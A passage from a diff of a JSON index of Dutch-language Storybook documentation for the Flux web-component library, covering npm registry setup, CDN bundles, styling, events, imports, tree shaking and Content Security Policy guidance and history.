<td>components/compliance</td>\n        <td><code>{`<vl-header>`}</code></td>\n        <td>-</td>\n        <td>-</td>\n    </tr>\n    <tr>\n        <td>[Header [next]](/docs/components-compliance-header-next--documentatie)</td>\n        <td>release v2.3.0</td>\n        <td>components/compliance/next</td>\n        <td><code>{`<vl-header-next>`}</code></td>\n        <td>components/compliance</td>\n        <td><code>{`<vl-header>`}</code></td>\n    </tr>\n</table>"
+          },
+          {
+            "id": "recepten-artifactory-configuratie--documentatie",
+            "title": "Recepten/Artifactory Configuratie",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-artifactory-configuratie--documentatie",
+            "added": "# Artifactory Configuratie\n\nAlle artifacts zijn beschikbaar via de [JFrog Artifactory](https://repo.omgeving.vlaanderen.be/ui/packages) van\nDepartement Omgeving. Om ze af te nemen dien je je `~/.npmrc` als volgt te configureren:\n\n```\nregistry=https://repo.omgeving.vlaanderen.be/artifactory/api/npm/acd-npm/\n//repo.omgeving.vlaanderen.be/artifactory/api/npm/acd-npm/:_authToken=xXxyYyzZz\n```\n\nJe persoonlijk authToken kan je vinden door naar [JFrog Artifactory](https://repo.omgeving.vlaanderen.be/ui/packages)\nte gaan, dan rechtsboven een `Log in` doen, links via `Artifacts` de repo `acd-npm` selecteren en dan via `Set Me Up`\nkan je een __token__ genereren.\n\n> **Opmerking**: als je (tijdelijk) wil wisselen naar de 'default' npm repository kan je in je `~/.npmrc` bestand de\nregistry lijn in commentaar zetten en vervangen door `registry=https://registry.npmjs.org/`"
+          },
+          {
+            "id": "recepten-cdn-bundel-fat-lib--documentatie",
+            "title": "Recepten/CDN Bundel - fat-lib",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-cdn-bundel-fat-lib--documentatie",
+            "added": "# CDN Bundel - fat-lib\n\nVoor gewone websites of legacy toepassingen (die geen bundler gebruiken) worden de 'compliance' web-componenten\nook beschikbaar gesteld via een statische bundel op de CDN. Doordat er dan geen bundler gebruikt wordt kan er geen\ntree-shaking plaatsvinden, om die rede bieden we het script enkel geversioneerd aan en niet onder een 'latest' variant.\nOp die manier moet je expliciet een versie specifiëren (om bewust te upgraden) en mag het bestand ge-cached worden - bij\neen nieuwe versie wijzigt de naam.\n\nDe `fat-lib` bestanden zijn beschikbaar onder `https://cdn.omgeving.vlaanderen.be/domg/domg-wc/x.y.z/`, daar staan per versie 3\nbestanden:\n\n- **domg-wc-compliance-2.0.0.js** - de leesbare variant [4,1 MB]\n- **domg-wc-compliance-2.0.0.js.map** - de map file om de leesbare variant te debuggen [5,1 MB]\n- **domg-wc-compliance-2.0.0.min.js** - de productie versie [2,4 MB]\n\n```\n<!DOCTYPE html>\n<html lang=\"nl\">\n<head>\n  <title>Flux Demo</title>\n  <script type=\"module\"\n          src=\"https://cdn.omgeving.vlaanderen.be/domg/domg-wc/2.0.0/domg-wc-compliance-2.0.0.min.js\"></script>\n</head>\n<body>\n  <div class=\"vl-content-block\">...</div>\n</body>\n</html>\n```"
+          },
+          {
+            "id": "recepten-configuratie--documentatie",
+            "title": "Recepten/Configuratie",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-configuratie--documentatie",
+            "added": "# Configuratie\n\nM.b.v. de statische klasse `FluxConfig` kunnen voorkeuren gewijzigd worden.\n\nDe defaults zijn:\n- autoRegisterStyles: true\n- logWebComponentRegistration: false\n- logTreeshakeRegistration: false\n\n\n## Afname via de npm-packages\n\nWijzig de defaults als volgt; voordat het eerste element geïmporteerd wordt.\n\n```\n\nFluxConfig.setPreferences({ logWebComponentRegistration: true });\n```\n\n**Opmerking**: ervoor zorgen dat deze code als eerste uitgevoerd wordt (alvorens de eerste component geregistreerd\nwordt) is specifiek aan de opzet en bundeling van de toepassing. Wat altijd zou moeten werken is:\n - een bestand aanmaken met bovenstaande code in (de import en het setPreferences statement) bvb. in `app.config.ts`\n - en dan dit bestand via een neven-effect import `import './app/app.config';` als allereerste importeren\n\n\n## Afname via 'fat-lib'\n\nWijzig de defaults m.b.v. het desbetreffende attribuut.\n\n```\n<script type=\"module\"\n    auto-register-styles=\"false\"\n    log-web-component-registration=\"true\"\n    log-treeshake-registration=\"true\"\n    src=\"https://cdn.omgeving.vlaanderen.be/domg/domg-wc/2.0.0/domg-wc-compliance-2.0.0.min.js\">\n</script>\n```"
+          },
+          {
+            "id": "recepten-css-styling--documentatie",
+            "title": "Recepten/CSS Styling",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-css-styling--documentatie",
+            "added": "# Styling\n\n## Globale CSS\n\nAlle Flux web-componenten, zijnde de web-componenten die zich in de package `@domg-wc/components` bevinden, zorgen\nervoor dat eenmalig alle css op document niveau geregistreerd wordt. Technisch gebeurt dat door de basis klasse\n`BaseLitElement` die de onderstaande `GlobalStyles.getInstance().register()` methode uitvoert:\n\n```\npublic register() {\n    if (!this.registered) {\n        if (FluxConfig.getPreferences().autoRegisterStyles) {\n            document.adoptedStyleSheets = [\n                ...document.adoptedStyleSheets,\n                ...(this.defaultStyles.map((style) => style.styleSheet) as CSSStyleSheet[]),\n            ];\n            console.info('GlobalStyles: global styling toegevoegd aan het document');\n        } else {\n            console.info(\n                'GlobalStyles: geen global styling toegevoegd aan het document - autoRegisterStyles is uitgeschakeld'\n            );\n        }\n        this.registered = true;\n        this.registerCustomCSS();\n    }\n}\n```\n\n## Eigen componenten met shadow DOM\n\nZoals hierboven vermeld injecteren de `@domg-wc elementen` hun eigen styling op root niveau.\nDit is voldoende in een applicatie waar de elementen niet gebruikt worden binnen andere shadow DOM's.\n\n{`\n    Als je zelf componenten ontwikkelt met een shadow DOM, dan moet je onze styling opnieuw injecteren in je component.<br>\n    De shadow DOM zal de styling niet doorlaten die globaal op het document niveau geregistreerd is.\n`}\n\nIn `Lit` kan je dit bvb. zo doen:\n\n```ts\n\nexport class ComponentMetShadowDom extends LitElement {\n\n    static get styles(): CSSResult[] {\n        return [...vlElementsStyle];\n    }\n}\n```\n\n\n## Custom CSS\n\n{`\n    Je kan de styling van DV breken bij het gebruik hiervan!\n`}\n\nVoor de componenten onder `map`, `form` en `components` is het mogelijk om een custom CSS-string mee te geven aan het\nattribuut `custom-css`. Deze CSS wordt dan toegevoegd aan de adoptedStyleSheets van de shadow DOM van\nde desbetreffende component.\n\n```html\n<vl-accordion-list custom-css=\".vl-accordion-list {border: 10px solid lightblue}\">\n```\n\n\n## Deactivatie Globale Styling\n\nIndien gewenst kan je de automatische registratie van globale (document) styling de-activeren via de\n`autoRegisterStyles` property, zie [configuratie](/docs/recepten-configuratie--documentatie)."
+          },
+          {
+            "id": "recepten-debounce--documentatie",
+            "title": "Recepten/Debounce",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-debounce--documentatie",
+            "added": "# Debounce (Common)\n\nDe `debounce` methode beperkt het aantal keren dat een functie aangeroepen wordt.\n\n## Voorbeeld\n\n```ts\n\ndocument.addEventListener('DOMContentLoaded', () => {\n    const inputField = document.getElementById('input-field'); // <vl-input-field id=\"input-field\"></vl-input-field>\n    if (inputField) {\n        inputField.addEventListener(\n            'vl-input',\n            debounce((event) => {\n                // doe iets\n            }, 200)\n        );\n    }\n});\n```"
+          },
+          {
+            "id": "recepten-debugging--documentatie",
+            "title": "Recepten/Debugging",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-debugging--documentatie",
+            "added": "# Debugging - map files\n\n## .map bestanden\n\nIn de npm packages van de flux-web-components zitten .js.map bestanden. De gewone .js bestanden hebben een referentie\nnaar die .js.map bestanden waarin de originele broncode (in TypeScript) zit. Als de configuratie juist is kan je\ndaarmee de broncode van de flux-web-components debuggen.\n\n## webpack bundler\n\nAls je je eindtoepassing bundelt met [webpack](https://webpack.js.org/) dien je in je webpack configuratie de\n[source-map-loader](https://webpack.js.org/loaders/source-map-loader/) toe te voegen. Deze plugin zorgt ervoor dat\nde .js.map bestanden transitief mee opgenomen worden in de bundel van de eindtoepassing.\n\nOm de plugin te gebruiken moet je hem installeren\n```\nnpm i -D source-map-loader\n```\n\nen nadien configureren\n```\nmodule.exports = {\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        enforce: \"pre\",\n        use: [\"source-map-loader\"],\n      },\n    ],\n  },\n};\n```"
+          },
+          {
+            "id": "recepten-events--documentatie",
+            "title": "Recepten/Events",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-events--documentatie",
+            "added": "# Events\n\n## Native- vs Custom-events\n\nDe Flux-componenten bieden eigen custom-events aan, deze hebben de prefix `vl-`.\n- De prefix maakt duidelijk dat het Flux-events zijn\n- en vermijden conflicten met standaard events of events van andere bibliotheken\n\nLuister bvb. naar `vl-change` of `vl-input` (i.p.v. `click`) bij het aanvinken van `vl-checkbox`. Dit kan belangrijk\nzijn wanneer je code momenteel naar native events luistert.\n\nOp de documentatie pagina van een component vind je onder `Configuratie` een overzicht van de custom-events,\nde native events worden niet vermeld!\n\nIndien aanwezig, heeft het de voorkeur te luisteren naar de custom events; deze worden typisch voorzien bij componenten:\n- die een complexe DOM-structuur hebben\n- waar extra informatie meegegeven wordt met het event\n- waar het belangrijk is dat we de timing / frequentie van de events zelf kunnen bepalen\n- waar we complexiteit rond retargeting willen omzeilen (zie hieronder)\n\n### Retargeting\n\nDe Flux-componenten ontsluiten typisch native componenten die op hun beurt native events hebben. Bv. een `<vl-button>`\nbevat een `<button>` die de `click`'s  ontvangt van de gebruiker.\n\nWeb-componenten [re-targetten](https://web.dev/articles/shadowdom-v1#the_shadow_dom_event_model) zelf bepaalde events,\nhierdoor lijken die native events voor afnemers van de web-component host (`vl-button`) zelf te komen in plaats van het\nnative element `<button>`. In dat voorbeeld is het belangrijk om `event.composedPath()` te gebruiken om het geklikte\nelement te achterhalen (`button`), in plaats van `event.target` die bv. `vl-button` zou geven.\n\nRetargeting kan er ook voor zorgen dat bv. bepaalde events meerdere keren binnen komen,\nterwijl je die maar 1 keer verwacht.\nMeer info rond het onderwerp vind je op [Lit.dev](https://lit.dev/docs/components/events/#adding-event-listeners-to-the-component-or-its-shadow-root).\n\n## Events in Lit\n\nLit, waar de nieuwere Flux-componenten gebruik van maken, heeft zelf een uitgebreide documentatie pagina over\n[events](https://lit.dev/docs/components/events/).\n\nIn plaats van event listeners te definiëren kan je `@event-naam` gebruiken om op een eenvoudigere manier met events\nom te gaan.\n\n```html\n<vl-button @vl-click=\"${(event: CustomEvent) => console.log('er is geklikt', event)}\">Click Me!</vl-button>\n```\n\n## Events afnemen in React\n\nTot en met React 18 was het minder eenvoudig om met web componenten om te gaan en is het aan de afnemer om bv. wrappers\nte voorzien.\n\nLit voorziet `@lit/react` die dit makkelijker maakt: [lit/react](https://lit.dev/docs/frameworks/react/). Dit laat het\ntoe om Lit componenten op een meer React native manier te gebruiken.\n\nVanaf React 19 zijn [custom elements nu volledig ondersteund](https://react.dev/blog/2024/12/05/react-19#support-for-custom-elements).\n\n<table>\n    <tr>\n        <td>Versie</td>\n        <td>Ondersteuning</td>\n    </tr>\n    <tr>\n        <td>React &lt;= 18</td>\n        <td>weinig ondersteuning maar gebruik van <strong>&#64;lit/react</strong> maakt het makkelijker</td>\n    </tr>\n    <tr>\n        <td>React 19</td>\n        <td>volledig ondersteund</td>\n    </tr>\n</table>\n\n\n> Voor React specifieke controllers, kan het belangrijk zijn om de wrapper aan te passen zodat je kan omgaan met onze\nspecifieke custom events\n\n\n## Referenties\n\n[Lit - Events](https://lit.dev/docs/components/events/)\n\n[Lit - @lit/react](https://lit.dev/docs/frameworks/react/)\n\n[MDN - Events](https://developer.mozilla.org/en-US/docs/Web/API/Event)"
+          },
+          {
+            "id": "recepten-formattering--documentatie",
+            "title": "Recepten/Formattering",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-formattering--documentatie",
+            "added": "# Formattering (Common)\n## formatNumber()\n### Gebruik\n### Voorbeelden\n## formatCurrency()\n### Gebruik\n### Voorbeelden\n## formatDate()\n### Gebruik\n### Voorbeelden\n## formatTime()\n### Gebruik\n### Voorbeelden\n## formatReadableDate()\n### Gebruik\n### Voorbeelden\n## formatDaysFromNow()\n### Gebruik\n### Voorbeelden\n## formatPercentage()\n### Gebruik\n### Voorbeelden\n(267 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "recepten-imports--documentatie",
+            "title": "Recepten/Imports",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-imports--documentatie",
+            "added": "# Imports\n\n## Import Varianten\n\nEr zijn verschillende manieren om te [importeren](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import).\nDe meest gangbare om de @domg-wc web-componenten te gebruiken zijn:\n\n### Import met side-effects\n\n```\n```\n\nVoor elke component is er op component niveau een barrel file voorzien (index.js). Indien er meerdere (sub-)componenten\nzijn worden deze allemaal door deze import geregistreerd, in dit geval `VlButtonElement` en `VlLinkButtonElement`.\nOp deze manier krijg je __geen referentie__ naar de component, maar zowel de IDE als de bundler (bvb. webpack) weerhoudt\nde code (ze wordt niet verwijderd omdat ze als dode code gezien wordt).\n\n### Named Import\n\n```\n\nregisterWebComponents([VlButtonComponent]);\n```\n\nBij een named import moet je ook 'iets' doen met de referentie, anders zal zowel de IDE als de bundler dit als 'dode'\ncode zien. Je IDE zal bij een re-arrange de import verwijderen, de bundler zal de code __niet weerhouden__.\nOm dit te vermijden moet je de referentie gebruiken. Het is voldoende de referentie op te nemen, gewoon `VlButtonElement;`\nonder je import zetten. Om echter duidelijk te maken waarom je dit doet voorzien we de methode `registerWebComponents`.\n\n### Named Import via root-barrel file\n\n```\n\nregisterWebComponents([VlButtonComponent]);\n```\n\nDit is een variant op de gewone named import. Elke @domg-wc artifact voorziet op root niveau een barrel file waarin alle\ncomponenten van het artifact ge-exporteerd worden. <br/>\nBelangrijk: in de package.json van het artifact wordt de root-barrel-file expliciet gemarkeerd als\n__zonder neveneffecten__. Dit maakt dat je op deze manier enkel de componenten die je refereert importeert, niets meer.\n\n## Side Effects\n\nEen [JavaScript side effect](https://sgom.es/posts/2020-06-15-everything-you-never-wanted-to-know-about-side-effects/)\nis code die uitgevoerd wordt omdat ze geïmporteerd wordt, niet omdat ze aangeroepen wordt. Dit heeft impact op het\ntree-shaken bij het bundelen. Vaak gebeurt het registreren van een web-component als side-effect in dezelfde module\n(bestand) als waar de component gedefinieerd wordt.\n\nOpmerking: de `@domg-wc` web-componenten worden geregistreerd m.b.v. de\n[decorator](https://netbasal.com/behind-the-scenes-how-typescript-decorators-operate-28f8dcacb224) `@webComponent`\ndie zorgt ervoor dat na typescript transpilatie de javascript code er als onderstaand uitziet. Daardoor zal de\nregistratie gebeuren onafhanklijk van de manier van importeren, zolang de code maar niet\n[ge-tree-shaked](/docs/recepten-tree-shaking--documentatie) wordt!\n\n```\nlet VlAccordionComponent = class VlAccordionComponent extends BaseHTMLElement {\n ...\n};\nVlAccordionComponent = __decorate([\n    webComponent('vl-accordion'),\n    __metadata(\"design:paramtypes\", [])\n], VlAccordionComponent);\nexport { VlAccordionComponent };\n```"
+          },
+          {
+            "id": "recepten-lit-binnen-andere-frameworks--documentatie",
+            "title": "Recepten/Lit binnen andere frameworks",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-lit-binnen-andere-frameworks--documentatie",
+            "added": "# Lit binnen andere frameworks\n\nOndersteuning voor de grootste frameworks vind je hieronder.\n\n<table>\n    <tr>\n        <td>Versie</td>\n        <td>Ondersteuning</td>\n    </tr>\n    <tr>\n        <td>Angular 16.2.10</td>\n        <td>volledig ondersteund</td>\n    </tr>\n    <tr>\n        <td>Vue 3.2.38</td>\n        <td>volledig ondersteund</td>\n    </tr>\n    <tr>\n        <td>React &lt;= 18</td>\n        <td>\n            weinig ondersteuning maar gebruik van\n            <span style={{color: 'black', fontWeight: 'bold'}}>&#64;lit/react</span> maakt het makkelijker\n        </td>\n    </tr>\n    <tr>\n        <td>React 19</td>\n        <td>volledig ondersteund</td>\n    </tr>\n</table>\n\nVoor een vollediger overzicht kan je terecht op\n[custom-elements-everywhere.com](https://custom-elements-everywhere.com/), een website waar de status van\n[custom elements](https://developer.mozilla.org/en-US/docs/Web/API/Web_components#custom_elements_2) en framework interopability testen wordt bijgehouden.\nDit komt typisch overeen met de compatibiliteit van Lit-elementen.\n\n## Referenties\n\n[React 19 - custom elements](https://react.dev/blog/2024/12/05/react-19#support-for-custom-elements)\n\n[Lit  - @lit/react](https://lit.dev/docs/frameworks/react/)\n\n[custom-elements-everywhere - overzicht](https://custom-elements-everywhere.com/)\n\n[Web Components - MDN](https://developer.mozilla.org/en-US/docs/Web/API/Web_components)"
+          },
+          {
+            "id": "recepten-rollup-beperkingen--documentatie",
+            "title": "Recepten/Rollup Beperkingen",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-rollup-beperkingen--documentatie",
+            "added": "# Rollup Beperkingen\n\n[Rollup](https://rollupjs.org/) is een module bundler die gebruikt kan worden om webcomponenten te bundelen. De te preferen bundler bij Departement Omgeving is [Webpack](https://webpack.js.org/).\n\n## CommonJS modules\n\nProjecten die opgebouwd zijn met `Rollup` kunnen problemen geven, bij het bundelen van third party libraries die CommonJS modules gebruiken. Dit komt omdat Rollup standaard ES modules verwacht en sommige libraries nog steeds CommonJS modules gebruiken. Dit kan opgelost worden door de `@rollup/plugin-commonjs` plugin te installeren en te configureren.\n\n## Imports\n\nAfhankelijk van de library kan je dit oplossen door de manier van import te veranderen.\nVoor sommige libraries zullen named imports niet werken. In dat geval moet je [namespace imports](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import#forms_of_import_declarations) gebruiken.\n\n### Named imports\n> ipv deze code:\n```TypeScript\n```\n\n### Namespace imports\n> gebruik deze code:\n```TypeScript\n```"
+          },
+          {
+            "id": "recepten-tree-shaking--documentatie",
+            "title": "Recepten/Tree Shaking",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-tree-shaking--documentatie",
+            "added": "# Tree Shaking\n\nAls je een bundler gebruikt - bvb. webpack of rollup - dan zal deze transitief (typisch vertrekkend vanuit je\napplicatieve index.js) enkel die code opnemen die je importeert. Code die niet gerefereerd wordt of als ongebruikt\ngezien wordt, belandt niet in de bundel. Dit proces van enkel relevante code opnemen noemt\n[tree shaking](https://webpack.js.org/guides/tree-shaking/).\n\nDe te prefereren bundler bij Departement Omgeving is webpack. Om te tree-shaken houdt webpack rekening met de\n['sideEffects'](https://webpack.js.org/guides/tree-shaking/#clarifying-tree-shaking-and-sideeffects) zoals\ngespecifieerd in de package.json's (zowel van de applicatie als van de bibliotheken die gerefereerd worden).\nBelangrijk hierbij is dat de default (indien er niets gespecifieerd wordt) `sideEffects=true` is. Dit heeft tot\ngevolg dat als je eender welke named import doet via een barrel file ook alle andere vermelde exports geïmporteerd\nworden. Om die rede worden in de `@domg-wc` artifacts de root-barrel files ge-exclude uit de sideEffects. Vroeger\n(< v1.17.0) werd de default gebruikt waardoor er niet ge-tree-shaked werd als je op die manier imports deed en via\nwebpack bundelde.\n\nOpmerking 1: webpack werkt eigenlijk niet conform de import specificatie, een named import zou eigenlijk geen\nside-effects mogen geven, daarvoor is expliciet de 'import with side-effects' voorzien.\n\nOpmerking 2: omdat we __op component niveau__ - voor webpack - sideffects activeren voor die sub-barrel files zorgt\ndat ervoor dat als je het onderstaande doet toch ook `VlLinkButtonElement` geregistreerd wordt. Terwijl als je via de\nroot-barrel file gaat VlLinkButtonElement niet geregistreerd wordt!\n\n```\nVlButtonComponent;\n```"
+          },
+          {
+            "id": "recepten-typing-bestanden--documentatie",
+            "title": "Recepten/Typing Bestanden",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/recepten-typing-bestanden--documentatie",
+            "added": "# Typing Bestanden - .d.ts files\n\nDe broncode van de flux-web-components wordt in TypeScript geschreven. In de npm packages wordt die code naar\nJavaScript getranspiled, daarnaast zitten er ook .d.ts bestanden in de bundel. Door eindtoepassingen in TypeScript te\nschrijven zorgen deze .d.ts bestanden ervoor dat je typed kan werken en er bvb. autocomplete functionaliteit in\nje IDE is.\n\n<img src={autocompletePng} alt=\"Autocomplete\" height=\"350px\"/>"
+          },
+          {
+            "id": "richtlijnen-content-security-policy-csp-problematieken--documentatie",
+            "title": "Richtlijnen/Content Security Policy/CSP Problematieken",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-content-security-policy-csp-problematieken--documentatie",
+            "added": "# CSP Problematieken\n\n## Web-componenten problematiek\n\nWeb-componenten encapsuleren zowel (technische) logica met JavaScript als visualisatie met html en css. Sommige\ncomponenten maken ook gebruik van externe bibliotheken. Voor CSP zijn er verschillende configuratie mogelijkheden.\nVanaf dat 1 component (of de achterliggende bibliotheek) een specifieke CSP regel moet openzetten moet dit voor de\nganse toepassing gebeuren.\n\nSinds v2.4.0 van de flux-web-componenten kan CSP voor bijna alle componenten en alle regels op het meest strikte gezet\nworden. Er zijn nog een beperkt aantal uitzonderingen nodig:\n\n- het domein `https://cdn.omgeving.vlaanderen.be` moet toegestaan worden om fonts, scripts en styles uit te halen,\n  omdat we vandaaruit ondersteunende, algemene zaken beschikbaar stellen\n- de `global-header` heeft extra domeinen nodig waarnaar aanvragen mogen gebeuren, omdat elke toepassing deze component\n  integreert moet dit steeds geconfigureerd worden, zie hieronder voor meer informatie\n- bij gebruik van de `vl-map` moeten images uit `https://geo.api.vlaanderen.be` beschikbaar zijn\n- de `vl-textarea-rich` embed TinyMCE, deze heeft (net als alle alternatieve rich-text editors) de configuratie\n  `style-src-attr 'unsafe-inline';` nodig, dit moet enkel voorzien worden als de toepassing deze component gebruikt\n\n\n## CSP en de global-header\n\nT.e.m. v2.2.0 integreerden de flux-web-componenten de v4 versie van de\n[global header](https://www.vlaanderen.be/digitaal-vlaanderen/onze-diensten-en-platformen/mijn-burgerprofiel/global-header-en-footer).\nSinds v2.3.0 is er een integratie beschikbaar met de nieuwe v5 versie via de `vl-header-next` en `vl-footer-next`\ncomponent. Technische informatie over de upgrade kan je vinden in de documentatie van Digitaal Vlaanderen:\n[upgraden van global header versie 4 naar 5](https://vlaamseoverheid.atlassian.net/wiki/spaces/IKPubliek/pages/7488733769/Upgraden+van+global+header+versie+4+naar+5).\n\nDe v4 versie van de header werkte enkel met de CSP configuratie `Content-Security-Policy: script-src 'unsafe-eval';`.\nOm die rede was CSP activeren met die versie redelijk zinloos: in de volledige toepassing moest 'unsafe-eval' actief\nzijn, waardoor [XSS](/docs/richtlijnen-content-security-policy-wat-is-csp--documentatie#cross-side-scripting) mogelijk\nis.\n\nDe nieuwe v5 versie verhelpt dit probleem, 'unsafe-eval' is niet meer nodig. Door de functionaliteit van de header\nmoeten er, afhankelijk van de omgeving, wel domeinen gespecifieerd worden waarnaar specifieke aanroepen mogen\ngebeuren. De lijst met CSP configuratie (per omgeving) is te vinden in de\n[v5 global-header](https://test.widgets.burgerprofiel.dev-vlaanderen.be/docs/global-header/index.html#content-security-policy-csp)\ndocumentatie.\n\n\n## CSP en vl-textarea-rich / TinyMCE\n\nDe `vl-textarea-rich` maakt gebruik van [TinyMCE](https://github.com/tinymce/tinymce). Alle rich text editor's hebben,\nom correct te werken, dezelfde CSP regel nodig: `\"Content-Security-Policy\": \"style-src-attr 'unsafe-inline';\"`. De rede\nis dat ze dynamisch tekst stylen via het style attribuut.\n\nEen fundamentele oplossing is er niet, in alternatieve rich text editors kan je met een\n['nonce'](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Global_attributes/nonce) werken of\nfunctionaliteit beperken. Een 'nonce' configureren is echter complex. Als je functionaliteit wil beperken kan je\noverwegen de gewone `vl-textarea` component te gebruiken.\n\nAls je er voor kiest `vl-textarea-rich` te gebruiken dien je dus `\"style-src-attr 'unsafe-inline';\"` te specifiëren.\nOp die manier laat je enkel toe dat scripts dynamisch het style attribuut zetten (of bewerken) op een DOM-element.\nAls alle andere CSP-regels strikt gedefinieerd zijn is er geen risico. In dat geval kunnen er geen scripts geïnjecteerd\nworden en alle scripts aanwezig zijn gekend omdat ze afkomstig zijn van een eigen (of toegelaten) domein, dus te\nvertrouwen. Het enige wat die vertrouwde scripts dan nog kunnen doen is styling, zijnde visualisatie, van DOM-elementen\nbeïnvloeden."
+          },
+          {
+            "id": "richtlijnen-content-security-policy-historiek-csp-aanpak--documentatie",
+            "title": "Richtlijnen/Content Security Policy/Historiek CSP Aanpak",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-content-security-policy-historiek-csp-aanpak--documentatie",
+            "added": "# Historiek CSP Aanpak\n\nVolgende acties werden in het verleden al genomen rond CSP:\n\n### augustus 2025 - v2.4.0\n\nVanaf v2.4.0 zijn alle componenten zo CSP-compliant mogelijk gemaakt via\n[FLUX-99](https://jira.omgeving.vlaanderen.be/jira/browse/FLUX-99). Alle componenten die reeds herschreven waren\nvia een 'next-' variant waren al CSP-compliant, er waren echter nog een hoop componenten die embedded `<style></style>`\nhadden. Deze zijn met deze release aangepast: de embedded style is verwijderd en de styling wordt nu geïnjecteerd via\nadoptedStyleSheets op de shadow-dom.\n\nDe volgende componenten werden in release v2.4.0 CSP-compliant gemaakt:\n- in **components/block**: `vl-accordion`, `vl-contact-card`, `vl-content-header`, `vl-document`,\n`vl-http-error-message`, `vl-info-tile`, `vl-infoblock`, `vl-loader`, `vl-modal`, `vl-pager`, `vl-proza-message`,\n`vl-rich-data`, `vl-rich-data-sorter`, `vl-rich-data-table`, `vl-search`, `vl-side-sheet`, `vl-tabs`, `vl-template`,\n`vl-typography`\n- in **components/compliance**: `vl-cookie-consent`, `vl-cookie-consent-opt-in`, `vl-cookie`, `vl-cookie-statement`,\n`vl-header`, `vl-header-next`\n- in **components/map**: `vl-map`, `vl-map-search`, `vl-map-side-sheet-menu`, `vl-map-side-sheet-menu-item`\n\nDe enige component die niet volledig CSP-compliant is is `vl-textarea-rich`,\nzie [CSP en vl-textarea-rich / TinyMCE](/docs/richtlijnen-content-security-policy-csp-problematieken--documentatie#csp-en-vl-textarea-rich--tinymce)\nvoor meer informatie hierrond.\n\n### juni 2025 - v2.3.0\n\nVia [FLUX-100](https://jira.omgeving.vlaanderen.be/jira/browse/FLUX-100) is een CSP veilige versie van de header\n(vl-header-next) en de footer (vl-footer-next) beschikbaar.\n\n### april 2024\n\nIn de 2e helft van 2024 worden alle elementen omgezet naar volwaardige componenten. Deze nieuwe code wordt ineens\nCSP-compliant gemaakt.\n\n### november 2023\n\nSinds eind 2023 worden de form componenten herschreven. We streven er naar die ineens CSP-compliant te maken. We\ndoen dit o.a. door de CSP-compliancy af te testen in de integrator-app.\n\n### maart 2023\n\nHet volgende is gemeld op de [TAW van 02/03/2023](https://www.milieuinfo.be/confluence/display/AEO/2023-03-02%3A%3A+Verslag)\ndoor Christophe De Blende en besproken:\n\n> Ik heb zo het gevoel dat de urgentie van CSP onderschat wordt. Hier een paar statistieken van de verschillende\naanvallen die op de RP innet gecapteerd worden: <a href=\"top-threats-20221013.pdf\" target=\"_blank\">23/10/2022</a>, <a href=\"top-threats-20230213.pdf\" target=\"_blank\">23/02/2023</a> en <a href=\"top-threats-20230227.pdf\" target=\"_blank\">27/02/2023</a>.\nVan belang, al wat via SSL gebeurt zien we zelf niet. Dus er zijn veel exploits die nog niet gedetecteerd worden\nomwille van de huidige firewall / ssl terminatie setup.<br/>\nEr is wel een tijdje een firewall loop toegevoegd geweest om log4j shell exploit te kunnen firefighten en deze\nstatistieken zijn ook meegenomen. Om aan te geven dat je met een factor 100 mag vermenigvuldigen wat je nu ziet\nin de dagdagelijkse statistieken.\n\nHierbij zijn er volgende vragen / bemerkingen:\n- hoe verhouden die statistieken zich tot CSP: welke zullen er verminderen / verdwijnen als CSP actief wordt ?\n- het 'algemeen activeren van CSP' op de reverse-proxy (wat Lode al eens geprobeerd zou hebben - op ontwikkel?) is\nniet zinvol, veel toepassingen zullen dan niet meer werken\n- CSP activatie zou applicatie per applicatie moeten doorgevoerd worden, omdat dit een grote doorlooptijd\n(maanden / jaren) zal hebben zouden statistieken per sub-domein uitgesplitst moeten worden om impact te kunnen zien\n\n### januari 2023\n\nIn het kader van ticket [UIG-2207](https://www.milieuinfo.be/jira/browse/UIG-2207) zijn er beperkt zaken bekeken."
+          },
+          {
+            "id": "richtlijnen-content-security-policy-hoe-csp-activeren--documentatie",
+            "title": "Richtlijnen/Content Security Policy/Hoe CSP Activeren",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-content-security-policy-hoe-csp-activeren--documentatie",
+            "added": "# Hoe CSP Activeren\n## Voorbereiding\n## Ideale CSP-configuratie\n## Lossere CSP Regels\n### CSP Hash\n### CSP Nonce\n## CSP Voorbeeld\n(106 regels toegevoegd of gewijzigd; lees de pagina zelf)"
+          },
+          {
+            "id": "richtlijnen-content-security-policy-wat-is-csp--documentatie",
+            "title": "Richtlijnen/Content Security Policy/Wat Is CSP",
+            "url": "https://flux.omgeving.vlaanderen.be/release-v2/2.5.0/storybook/?path=/docs/richtlijnen-content-security-policy-wat-is-csp--documentatie",
